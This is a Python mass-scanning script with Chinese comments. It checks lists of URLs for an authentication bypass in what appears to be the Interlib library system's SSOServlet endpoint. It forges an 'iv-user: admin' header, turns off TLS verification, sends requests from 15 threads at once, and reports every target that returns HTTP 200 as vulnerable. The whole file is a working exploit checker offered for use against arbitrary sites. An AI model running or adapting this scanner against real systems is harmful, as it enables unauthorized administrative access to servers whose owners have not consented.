import argparse  # 导入处理命令行参数的模块
import requests  # 导入用于发送HTTP请求的模块
import urllib3  # 导入处理HTTP请求的模块
from concurrent.futures import ThreadPoolExecutor  # 导入线程池，用于并发执行任务
from urllib3.exceptions import InsecureRequestWarning  # 导入处理不安全请求警告的异常

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def send_request(url):
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'iv-user': 'admin',  # 添加自定义的HTTP头部信息
        'Connection': 'close'  # 关闭HTTP连接复用
    }
    try:
        # 发送GET请求到目标URL的特定路径，并禁用SSL证书验证
        response = requests.get(url + '/interlib/common/SSOServlet?', headers=headers, verify=False)
        if response.status_code == 200:
            print(f'{url} 存在逻辑绕过漏洞.')  # 若返回状态码为200，则认为存在漏洞
        else:
            print(f'{url} no.')  # 否则打印无漏洞信息
    except requests.RequestException as e:
        print(f'Error scanning {url}: {e}')  # 捕获请求异常，并打印错误信息

def main():
    parser = argparse.ArgumentParser()  # 创建参数解析器
    parser.add_argument('-u', '--url', help='Single URL to scan')  # 添加单个URL扫描参数
    parser.add_argument('-r', '--readfile', help='File containing list of URLs to scan')  # 添加包含URL列表的文件参数
    args = parser.parse_args()  # 解析命令行参数

    urls = []
    if args.url:
        urls.append(args.url)  # 如果提供了单个URL，则将其添加到URL列表中
    if args.readfile:
        with open(args.readfile, 'r') as file:
            urls.extend([line.strip() for line in file.readlines()])  # 如果提供了文件参数，则读取文件中的URL并添加到URL列表中

    with ThreadPoolExecutor(max_workers=15) as executor:  # 使用最大15个线程并发执行任务
        executor.map(send_request, urls)  # 对URL列表中的每个URL调用send_request函数并发执行

if __name__ == "__main__":
    main()  # 执行主程序入口
